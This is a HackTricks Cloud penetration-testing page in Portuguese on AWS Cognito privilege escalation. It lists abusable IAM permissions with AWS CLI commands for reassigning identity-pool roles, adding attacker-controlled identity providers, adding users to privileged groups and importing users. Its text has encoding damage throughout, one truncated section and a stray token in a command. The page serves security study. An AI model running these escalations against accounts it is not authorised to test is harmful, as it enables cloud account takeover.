# AWS - Cognito Privesc

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Cognito

Para mais informa√ß√µes sobre o Cognito, verifique:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Coletando credenciais do Identity Pool

Como o Cognito pode conceder **credenciais de fun√ß√£o IAM** tanto para usu√°rios **autenticados** quanto **n√£o autenticados**, se voc√™ localizar o **ID do Identity Pool** de um aplicativo (deve estar codificado nele), voc√™ pode obter novas credenciais e, portanto, privesc (dentro de uma conta AWS onde voc√™ provavelmente nem tinha nenhuma credencial anteriormente).

Para mais informa√ß√µes [**verifique esta p√°gina**](../aws-unauthenticated-enum-access/#cognito).

**Impacto potencial:** Privesc direto para a fun√ß√£o de servi√ßo anexada a usu√°rios n√£o autenticados (e provavelmente para a anexada a usu√°rios autenticados).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Com essa permiss√£o, voc√™ pode **conceder qualquer fun√ß√£o cognito** aos usu√°rios autenticados/n√£o autenticados do aplicativo cognito.

```bash
aws cognito-identity set-identity-pool-roles \
    --identity-pool-id <identity_pool_id> \
    --roles unauthenticated=<role ARN>

# Obtenha credenciais
## Obtenha um ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Obtenha credenciais para esse ID
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```

Se o aplicativo cognito **n√£o tiver usu√°rios n√£o autenticados habilitados**, voc√™ tamb√©m pode precisar da permiss√£o `cognito-identity:UpdateIdentityPool` para habilit√°-lo.

**Impacto potencial:** Privesc direto para qualquer fun√ß√£o cognito.

### `cognito-identity:update-identity-pool`

Um invasor com essa permiss√£o poderia definir, por exemplo, um Cognito User Pool sob seu controle ou qualquer outro provedor de identidade onde ele possa fazer login como uma **maneira de acessar este Cognito Identity Pool**. Em seguida, apenas **fazer login** nesse provedor de usu√°rio permitir√° que ele acesse a fun√ß√£o autenticada configurada no Identity Pool.

```bash
# Este exemplo est√° usando um Cognito User Pool como provedor de identidade
## mas voc√™ pode usar qualquer outro provedor de identidade
aws cognito-identity update-identity-pool \
    --identity-pool-id <value> \
    --identity-pool-name <value> \
    [--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
    --cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Agora voc√™ precisa fazer login no User Pool que configurou
## depois de ter o token de ID do login, continue com os seguintes comandos:

# Nesta etapa, voc√™ j√° deve ter um token de ID
aws cognito-identity get-id \
    --identity-pool-id <id_pool_id> \
    --logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Obtenha o identity_id da resposta do comando anterior
aws cognito-identity get-credentials-for-identity \
    --identity-id <identity_id> \
    --logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```

Tamb√©m √© poss√≠vel **abusar dessa permiss√£o para permitir autentica√ß√£o b√°sica**:

```bash
aws cognito-identity update-identity-pool \
    --identity-pool-id <value> \
    --identity-pool-name <value> \
    --allow-unauthenticated-identities
    --allow-classic-flow
```

**Impacto potencial**: Comprometimento da fun√ß√£o IAM autenticada configurada dentro do pool de identidade.



### `cognito-idp:AdminAddUserToGroup`

Essa permiss√£o permite **adicionar um usu√°rio Cognito a um grupo Cognito**, portanto, um invasor pode abusar dessa permiss√£o para adicionar um usu√°rio sob seu controle a outros grupos com **privil√©gios melhores** ou **fun√ß√µes IAM diferentes**:

```bash
aws cognito-idp admin-add-user-to-group \
    --user-pool-id <value> \
    --username <value> \
    --group-name <value>
```

**Impacto potencial:** Privesc para outros grupos Cognito e fun√ß√µes IAM anexadas a grupos de pool de usu√°rios.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Um invasor com essas permiss√µes poderia **criar/atualizar grupos** com **
### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Um atacante com essa permiss√£o poderia **criar um novo Cliente de Pool de Usu√°rios menos restrito** do que os clientes de pool existentes. Por exemplo, o novo cliente poderia permitir qualquer tipo de m√©todo de autentica√ß√£o, n√£o ter nenhum segredo, ter a revoga√ß√£o de token desativada, permitir que os tokens sejam v√°lidos por um per√≠odo mais longo...

O mesmo pode ser feito se, em vez de criar um novo cliente, um **j√° existente for modificado**.

Na [**linha de comando**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (ou na [**atualiza√ß√£o**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) voc√™ pode ver todas as op√ß√µes, verifique!

```bash
aws cognito-idp create-user-pool-client \
    --user-pool-id <value> \
    --client-name <value> \
    [...]
```

**Impacto potencial:** Privesc indireto potencial para o usu√°rio autorizado do Pool de Identidade usado pelo Pool de Usu√°rios, criando um novo cliente que relaxa as medidas de seguran√ßa e torna poss√≠vel para um atacante fazer login com um usu√°rio que ele foi capaz de criar.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Um atacante pode abusar dessa permiss√£o para criar usu√°rios fazendo upload de um csv com novos usu√°rios.

```bash
# Criar um novo trabalho de importa√ß√£o
aws cognito-idp create-user-import-job \
    --job-name <value> \
    --user-pool-id <value> \
    --cloud-watch-logs-role-arn <value>

# Usar um novo trabalho de importa√ß√£o
aws cognito-idp start-user-import-job \
    --user-pool-id <value> \
    --job-id <value>

# Ambas as op√ß√µes acima fornecer√£o uma URL onde voc√™ pode enviar o arquivo CVS com os usu√°rios a serem criados
curl -v -T "PATH_TO_CSV_FILE" \
    -H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```

(No caso em que voc√™ cria um novo trabalho de importa√ß√£o, voc√™ tamb√©m pode precisar da permiss√£o passrole do iam, eu ainda n√£o testei).

**Impacto potencial:** Privesc direto para o papel IAM do pool de identidade para usu√°rios autenticados. Privesc indireto para outras funcionalidades do aplicativo, sendo capaz de criar qualquer usu√°rio.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Um atacante poderia criar um novo provedor de identidade para, em seguida, ser capaz de **fazer login por meio deste provedor**.

```bash
aws cognito-idp create-identity-provider \
    --user-pool-id <value> \
    --provider-name <value> \
    --provider-type <value> \
    --provider-details <value> \
    [--attribute-mapping <value>] \
    [--idp-identifiers <value>]
```

**Impacto potencial:** Privesc direto para o papel IAM do pool de identidade para usu√°rios autenticados. Privesc indireto para outras funcionalidades do aplicativo, sendo capaz de criar qualquer usu√°rio.

### cognito-sync:\* An√°lise

Esta √© uma permiss√£o muito comum por padr√£o em fun√ß√µes de Pools de Identidade do Cognito. Mesmo que um caractere curinga em uma permiss√£o sempre pare√ßa ruim (especialmente vindo da AWS), as **permiss√µes concedidas n√£o s√£o super √∫teis do ponto de vista de um atacante**.

Essa permiss√£o permite ler informa√ß√µes de uso de Pools de Identidade e IDs de Identidade dentro de Pools de Identidade (que n√£o s√£o informa√ß√µes sens√≠veis).\
Os IDs de identidade podem ter [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) atribu√≠dos a eles, que s√£o informa√ß√µes das sess√µes (a AWS define isso como um **jogo salvo**). Pode ser poss√≠vel que isso contenha algum tipo de informa√ß√£o sens√≠vel (mas a probabilidade √© bastante baixa). Voc√™ pode encontrar na [**p√°gina de enumera√ß√£o**](../aws-services/aws-cognito-enum/) como acessar essas informa√ß√µes.

Um atacante tamb√©m pode usar essas permiss√µes para **se inscrever em um fluxo Cognito que publica altera√ß√µes** nesses datasets ou um **lambda que dispara em eventos cognito**. Eu n√£o vi isso sendo usado, e n√£o esperaria informa√ß√µes sens√≠veis aqui, mas n√£o √© imposs√≠vel.

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga** me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>